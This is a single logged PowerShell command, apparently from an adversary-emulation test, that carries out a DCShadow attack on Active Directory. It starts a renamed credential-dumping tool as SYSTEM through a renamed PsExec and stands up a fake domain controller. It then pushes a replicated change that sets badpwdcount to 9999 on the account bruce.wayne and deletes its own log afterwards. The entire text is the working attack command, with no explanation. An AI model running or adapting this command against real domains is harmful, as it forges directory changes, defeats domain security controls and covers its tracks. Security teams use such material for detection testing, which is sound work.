"powershell.exe" & {# starting fake DC server, as SYSTEM (required), $dc_output_file = \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\art-data-script-DC.log\"", Remove-Item $dc_output_file -ErrorAction Ignore, $scriptParam =\""`\""log $dc_output_file`\"" `\""lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\"" `\""exit`\""\"", $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \""/c 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\PSTools\script.exe' /accepteula -d -s C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\x64\script.exe $scriptParam\"", # wait for fake DC server to be ready..., Start-Sleep -Seconds 5, # server ready, so trigger replication (push) and wait until it finished, & \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\x64\script.exe\"" \""lsadump::dcshadow /push\"" \""exit\"", Write-Host \""`nWaiting for fake DC server to return\"", Wait-Process $dc, Write-Host \""`nOutput from fake DC server:\"", Get-Content $dc_output_file, Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it, Remove-Item $dc_output_file -ErrorAction Ignore, Write-Host \""End of DCShadow\""}
